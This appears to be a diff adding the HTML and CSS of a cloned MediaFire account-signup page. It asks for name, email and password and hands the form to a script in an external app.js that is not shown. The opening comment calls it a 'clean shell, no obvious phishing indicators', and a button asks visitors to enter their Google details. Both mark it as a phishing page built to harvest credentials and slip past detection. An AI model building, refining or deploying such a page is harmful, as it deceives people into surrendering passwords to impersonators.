@@ -1,0 +1,231 @@
+<!-- index.html — clean shell, no obvious phishing indicators -->
+<!DOCTYPE html>
+<html lang="en-US">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>File sharing and storage made simple: Create a New User</title>
+<meta name="description" content="MediaFire is a simple to use free service that lets you put all your photos, documents, music, and video in a single place so you can access them anywhere and share them everywhere.">
+<link href="https://fonts.googleapis.com/css?family=Open+Sans:800,700,400,300" rel="stylesheet">
+<link rel="icon" href="https://www.mediafire.com/favicon.ico">
+<style>
+* { margin: 0; padding: 0; box-sizing: border-box; }
+body { font-family: "Open Sans", sans-serif; background: #f5f5f5; color: #333; line-height: 1.5; }
+.wrap { max-width: 1200px; margin: 0 auto; padding: 0 20px; }
+.sr-only { position: absolute; width: 1px; height: 1px; padding: 0; margin: -1px; overflow: hidden; clip: rect(0,0,0,0); border: 0; }
+#signupHeader { background: #fff; border-bottom: 1px solid #e0e0e0; padding: 16px 0; }
+#signupHeader .wrap { display: flex; align-items: center; justify-content: space-between; flex-wrap: wrap; gap: 16px; }
+#signupLogo { width: 180px; height: 25px; background: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 180 25'%3E%3Ctext x='0' y='20' font-family='Arial' font-size='20' font-weight='bold' fill='%230077ff'%3EMediaFire%3C/text%3E%3C/svg%3E") no-repeat left center; background-size: contain; }
+.ProgressTracker ol { list-style: none; display: flex; gap: 32px; }
+.ProgressTracker li { font-size: 13px; color: #999; position: relative; padding-left: 24px; }
+.ProgressTracker li::before { content: ""; position: absolute; left: 0; top: 50%; transform: translateY(-50%); width: 16px; height: 16px; border-radius: 50%; border: 2px solid #ccc; }
+.ProgressTracker li.is-complete { color: #333; }
+.ProgressTracker li.is-complete::before { background: #0077ff; border-color: #0077ff; }
+.ProgressTracker li.is-active { color: #0077ff; font-weight: 600; }
+.ProgressTracker li.is-active::before { border-color: #0077ff; }
+#main { padding: 48px 0; }
+.SignupLayout { max-width: 400px; margin: 0 auto; }
+.h5 { font-size: 24px; font-weight: 400; text-align: center; margin-bottom: 32px; color: #202124; }
+#socialLogin { margin-bottom: 8px; }
+#socialLogin button { display: flex; align-items: center; justify-content: flex-start; width: 330px; margin: 0 auto; height: 40px; color: #000; background: #EFF0F0; padding: 6px 32px 6px 12px; line-height: 18px; border: 0; border-radius: 3px; cursor: pointer; font-family: "Open Sans", sans-serif; font-size: 14px; }
+#socialLogin button:hover { background: #e0e0e0; }
+#socialLogin button img { height: 20px; width: 20px; margin-right: 12px; }
+#socialLogin button .label { flex-grow: 1; text-transform: uppercase; text-align: center; font-weight: 500; }
+.divider { display: flex; align-items: center; text-transform: uppercase; text-align: center; margin: 16px auto; width: 330px; color: #999; font-size: 13px; }
+.divider::before, .divider::after { content: ""; flex: 1; border-bottom: 1px solid rgba(0,0,0,0.08); margin: 0 10px; }
+.divider span { white-space: nowrap; }
+.SignupForm { width: 100%; }
+.Form-inputWrap { position: relative; margin-bottom: 16px; }
+.FloatingLabel-input { width: 100%; padding: 14px 12px; border: 1px solid #dadce0; border-radius: 4px; font-size: 16px; font-family: "Open Sans", sans-serif; outline: none; transition: border-color 0.2s; background: #fff; color: #202124; }
+.FloatingLabel-input:focus { border-color: #0077ff; border-width: 2px; padding: 13px 11px; }
+.FloatingLabel-label { position: absolute; left: 12px; top: 50%; transform: translateY(-50%); color: #999; font-size: 16px; pointer-events: none; transition: all 0.2s; background: #fff; padding: 0 4px; }
+.FloatingLabel-input:focus + .FloatingLabel-label, .FloatingLabel-input:not(:placeholder-shown) + .FloatingLabel-label { top: 0; font-size: 12px; color: #0077ff; }
+.Form-inputErrorText { display: none; color: #d93025; font-size: 12px; margin-top: 4px; padding-left: 12px; }
+.mb-5 { margin-bottom: 20px; }
+.mb-2 { margin-bottom: 8px; }
+.gbtnTertiary { width: 100%; padding: 14px; background: #0077ff; color: #fff; border: none; border-radius: 4px; font-size: 14px; font-weight: 600; cursor: pointer; text-transform: uppercase; letter-spacing: 0.5px; font-family: "Open Sans", sans-serif; }
+.gbtnTertiary:hover { background: #005bb5; }
+#loginLink { text-align: center; margin: 16px 0; font-size: 13px; color: #333; }
+#loginLink a { color: #0077ff; text-decoration: none; }
+#loginLink a:hover { text-decoration: underline; }
+.policies-note { width: 330px; margin: 8px auto 0; font-size: 12px; padding-top: 8px; border-top: 1px solid #EAEAEB; color: #71757F; font-weight: 400; text-align: center; line-height: 1.6; }
+.policies-note a { color: #0077ff; text-decoration: none; }
+#checkout_page_processing { display: none; text-align: center; padding: 100px 20px; }
+#checkout_page_processing.active { display: block; }
+#checkout_page_processing img { width: 32px; height: 32px; margin-top: 100px; }
+#processing_message { font-weight: bold; display: block; padding-top: 20px; color: #333; }
+#footer { background: #1a1a2e; color: #fff; padding: 40px 0 20px; margin-top: 60px; }
+.footerColWrap { display: flex; justify-content: space-between; flex-wrap: wrap; gap: 32px; }
+.footerCol { flex: 1; min-width: 140px; }
+.footerCol h2 { font-size: 14px; font-weight: 600; margin-bottom: 12px; }
+.footerCol h2 a { color: #fff; text-decoration: none; }
+.footerCol ul { list-style: none; }
+.footerCol li { margin-bottom: 8px; }
+.footerCol a { color: #aaa; text-decoration: none; font-size: 13px; }
+.footerCol a:hover { color: #fff; }
+#subFooterWrap { border-top: 1px solid #333; margin-top: 32px; padding-top: 20px; }
+#subFooter { display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; gap: 16px; }
+.subFooterLinks { list-style: none; display: flex; gap: 16px; flex-wrap: wrap; }
+.subFooterLinks li { color: #aaa; font-size: 12px; }
+.subFooterLinks a { color: #aaa; text-decoration: none; font-size: 12px; }
+.subFooterLinks a:hover { color: #fff; }
+#simpleFooter { background: #1a1a2e; border-top: 1px solid #333; padding: 16px 0; text-align: center; color: #aaa; font-size: 12px; }
+#simpleFooter a { color: #0077ff; text-decoration: none; }
+.has-error .FloatingLabel-input { border-color: #d93025 !important; }
+.has-error .Form-inputErrorText { display: block; }
+@media (max-width: 600px) { .ProgressTracker { display: none; } #socialLogin button, .divider, .policies-note { width: 100%; } .footerColWrap { flex-direction: column; gap: 24px; } #subFooter { flex-direction: column; text-align: center; } }
+</style>
+</head>
+<body>
+
+<header id="signupHeader" role="banner">
+    <div class="wrap">
+        <div id="signupLogo"></div>
+        <div class="header-gt-cont"></div>
+        <div role="group" aria-label="progress" class="ProgressTracker">
+            <ol>
+                <li class="is-complete">Choose Plan <span class="sr-only">, step completed</span></li>
+                <li class="is-active">Create Account <span class="sr-only">, current step</span></li>
+            </ol>
+        </div>
+    </div>
+</header>
+
+<main id="main" class="SignupLayout wrap" role="main">
+    <div id="mp_signup_block-wrap" class="wrap">
+        <div id="jq_signup">
+            <div id="checkout_page_processing">
+                <img src="https://static.mediafire.com/images/icons/ajax-loader-grey_round.gif" alt="Processing indicator">
+                <span id="processing_message"><span>Processing.</span> <span>Please Wait.</span></span>
+            </div>
+            <div id="checkout_page_show">
+                <div>
+                    <h1 class="h5 text-center sr-only">Create your account</h1>
+                    <div id="socialLogin">
+                        <button type="button" id="googleLoginBtn">
+                            <img src="https://static.mediafire.com/images/logos/google.svg" alt="Google Logo">
+                            <span class="label">please signup using your Google details below</span>
+                        </button>
+                    </div>
+                    <div class="divider"><span>or</span></div>
+                    <form id="signup_form" name="signup_form" class="SignupForm" onsubmit="return handleSubmit(event)">
+                        <input type="hidden" name="security" value="1782606213.c120681c098cd4ec21130e2412d1f7c856ef2988abf76395dfc1cc135d12589e">
+                        <fieldset>
+                            <legend class="sr-only">Your information</legend>
+                            <div class="SignupForm-firstNameField mb-5">
+                                <label class="sr-only" for="reg_first_name">First Name</label>
+                                <div class="Form-inputWrap FloatingLabel" id="wrap_first_name">
+                                    <input type="text" class="FloatingLabel-input" name="reg_first_name" id="reg_first_name" placeholder=" " required autocomplete="off">
+                                    <div class="FloatingLabel-label" aria-hidden="true"><span>First Name</span></div>
+                                    <div class="Form-inputErrorText" aria-live="assertive">This field requires attention.</div>
+                                </div>
+                            </div>
+                            <div class="SignupForm-lastNameField mb-5">
+                                <label class="sr-only" for="reg_last_name">Last Name</label>
+                                <div class="Form-inputWrap FloatingLabel" id="wrap_last_name">
+                                    <input type="text" class="FloatingLabel-input" name="reg_last_name" id="reg_last_name" placeholder=" " required autocomplete="off">
+                                    <div class="FloatingLabel-label" aria-hidden="true"><span>Last Name</span></div>
+                                    <div class="Form-inputErrorText" aria-live="assertive">This field requires attention.</div>
+                                </div>
+                            </div>
+                            <div class="SignupForm-emailField mb-5">
+                                <label class="sr-only" for="reg_email">Email</label>
+                                <div class="Form-inputWrap FloatingLabel" id="wrap_email">
+                                    <input type="email" class="FloatingLabel-input" name="reg_email" id="reg_email" placeholder=" " required autocomplete="off">
+                                    <div class="FloatingLabel-label" aria-hidden="true"><span>Email</span></div>
+                                    <div class="Form-inputErrorText" aria-live="assertive">This field requires attention.</div>
+                                </div>
+                            </div>
+                            <div class="SignupForm-passwordField mb-5">
+                                <label class="sr-only" for="reg_pass">Password</label>
+                                <div class="Form-inputWrap FloatingLabel" id="wrap_password">
+                                    <input type="password" class="FloatingLabel-input" name="reg_pass" id="reg_pass" placeholder=" " required maxlength="30" autocomplete="off">
+                                    <div class="FloatingLabel-label" aria-hidden="true"><span>Password</span></div>
+                                    <div class="Form-inputErrorText" aria-live="assertive">This field requires attention.</div>
+                                </div>
+                            </div>
+                        </fieldset>
+                        <div class="mb-5" id="verify_tos">
+                            <input type="hidden" id="agreement" name="agreement" value="3.25">
+                        </div>
+                        <input type="hidden" name="pid" value="free">
+                        <input type="submit" id="signup_continue" name="signup_continue" value="Create Account & Continue" class="gbtnTertiary mb-2">
+                        <p id="loginLink" class="text-center mb-2">
+                            Already have an account? <a href="https://www.mediafire.com/login/?pid=free">Log in</a>
+                        </p>
+                        <div class="text-center policies-note">
+                            By continuing, you are setting up a MediaFire account and agree to the 
+                            <a href="https://www.mediafire.com/policies/privacy_policy.php" target="_blank">Privacy Policy</a> and 
+                            <a href="https://www.mediafire.com/policies/terms_of_service.php" target="_blank">Terms of Service</a>.
+                        </div>
+                    </form>
+                </div>
+            </div>
+            <iframe title="MediaFire registration iframe" width="50" height="0" name="mp_registration_iframe" id="mp_registration_iframe" scrolling="no" frameborder="0" tabindex="-1" style="display:none;"></iframe>
+        </div>
+    </div>
+</main>
+
+<input type="hidden" id="pagename" value="registration">
+
+<footer id="footer" class="footer" role="contentinfo">
+    <div class="wrap" id="mainFooterWrap">
+        <div class="footerColWrap cf">
+            <div class="footerCol">
+                <h2><a href="https://www.mediafire.com/about/">Company</a></h2>
+                <ul>
+                    <li><a href="https://www.mediafire.com/about/">About Us</a></li>
+                    <li><a href="https://www.mediafire.com/about/jobs.php">Careers</a></li>
+                    <li><a href="https://www.mediafire.com/press/">Press</a></li>
+                    <li><a href="https://blog.mediafire.com/" target="_blank">Company Blog</a></li>
+                </ul>
+            </div>
+            <div class="footerCol">
+                <h2><a href="https://www.mediafire.com/software/index.php">Tools</a></h2>
+                <ul>
+                    <li><a href="https://www.mediafire.com/software/mobile/">MediaFire Mobile</a></li>
+                    <li><a href="https://www.jotary.com/?utm_source=mfftr_upgrade_re" target="_blank" rel="noopener noreferrer">Text Sharing for AI Workflows</a></li>
+                </ul>
+            </div>
+            <div class="footerCol">
+                <h2><a href="https://www.mediafire.com/upgrade/">Upgrade</a></h2>
+                <ul>
+                    <li><a href="https://www.mediafire.com/upgrade/index.php?plan=Pro">Professional</a></li>
+                </ul>
+            </div>
+            <div class="footerCol" style="margin-right:0;">
+                <h2><a href="https://mediafire.zendesk.com/hc/en-us" target="_blank">Support</a></h2>
+                <ul>
+                    <li><a href="https://mediafire.zendesk.com/hc/en-us" target="_blank">Get Support</a></li>
+                </ul>
+            </div>
+        </div>
+    </div>
+    <div id="subFooterWrap">
+        <div id="subFooter" class="wrap">
+            <ul class="subFooterLinks">
+                <li id="copyrightInfo">&copy;2026 MediaFire<span> Build 121967</span></li>
+                <li><a href="https://www.mediafire.com/advertising/">Advertising</a></li>
+                <li><a href="https://www.mediafire.com/policies/terms_of_service.php">Terms</a></li>
+                <li><a href="https://www.mediafire.com/policies/privacy_policy.php">Privacy Policy</a></li>
+                <li><a href="https://www.mediafire.com/policy_violation/copyright.php">Copyright</a></li>
+                <li><a href="https://www.mediafire.com/policy_violation/terms_of_service.php">Abuse</a></li>
+                <li><a href="https://www.mediafire.com/credits/">Credits</a></li>
+                <li><a href="https://www.mediafire.com/about/">More...</a></li>
+            </ul>
+        </div>
+    </div>
+</footer>
+
+<footer id="simpleFooter" role="contentinfo">
+    <div class="wrap">
+        <span>&copy;2026 MediaFire&nbsp;&nbsp; <span>Build 121967</span></span>
+        <span style="opacity:.5;border-left:1px solid #999;margin:0 8px 0 10px;"></span>
+        Need help? <a href="https://www.mediafire.com/help/submit_a_ticket.php" target="_blank">Submit a ticket</a>.
+    </div>
+</footer>
+
+<script src="app.js"></script>
+
+</body>
+</html>
